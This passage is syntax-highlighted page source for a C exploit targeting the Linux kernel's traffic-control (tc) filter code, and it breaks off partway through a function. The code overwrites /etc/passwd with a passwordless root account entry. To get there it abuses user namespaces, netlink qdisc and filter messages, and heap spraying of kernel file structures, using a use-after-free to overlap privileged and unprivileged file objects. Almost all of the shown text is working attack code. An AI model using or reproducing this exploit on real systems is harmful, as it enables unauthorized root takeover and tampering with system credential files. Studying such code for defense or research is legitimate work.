class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $ gcc -static -pthread -O0 ./exploit.c -o ./exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* target = <span class="string">&quot;/etc/passwd&quot;</span>;                   <span class="comment">// overwrite the target file</span></span><br><span class="line"><span class="keyword">char</span>* overwrite = <span class="string">&quot;hi:x:0:0:root:/:/bin/sh\n&quot;</span>;  <span class="comment">// &quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n&quot;</span></span><br><span class="line"><span class="keyword">char</span>* global;</span><br><span class="line"><span class="keyword">char</span>* self_path;</span><br><span class="line"><span class="keyword">char</span>* content;                                  <span class="comment">// evil data + existing data in the target file</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;     <span class="comment">// unprivileged `file`</span></span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;     <span class="comment">// privileged `file`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;      <span class="comment">// num of cpu cores</span></span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>; <span class="comment">// 4000</span></span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>; <span class="comment">// 5000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];       <span class="comment">// notify process to excecute using pipe</span></span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;      <span class="comment">// let thread 2 begin to write evil data</span></span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;      <span class="comment">// let thread 3 begin to spray privileged `file`</span></span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span>*)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// set cpu affinity</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* what, ...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup working dir</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span>* tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup process memory</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;  <span class="comment">// RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 需设置为 14096, 便于喷射 `file` 结构</span></span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg)                                                       \</span></span><br><span class="line"><span class="meta">  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"><span class="comment">// add attribute</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span>* attr, <span class="keyword">int</span> type, <span class="keyword">void</span>* data, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span> =</span> (struct rtattr*)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add attribute (maxlen limitation)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">int</span> alen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr* <span class="title">addattr_nest</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr* n, struct rtattr* nest)</span> </span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span>*)NLMSG_TAIL(n) - (<span class="keyword">void</span>*)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add_qdisc() —— setup the socket</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc                                          nlmsghdr + tcmsg</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);       <span class="comment">// sfq is not defaully configured, only qfq is configured</span></span><br><span class="line">    <span class="comment">// print_hex(msg, msg-&gt;nlmsg_len);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// spray 1 vulnerable object (filter) with customized flags</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle, <span class="keyword">u_int16_t</span> flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span 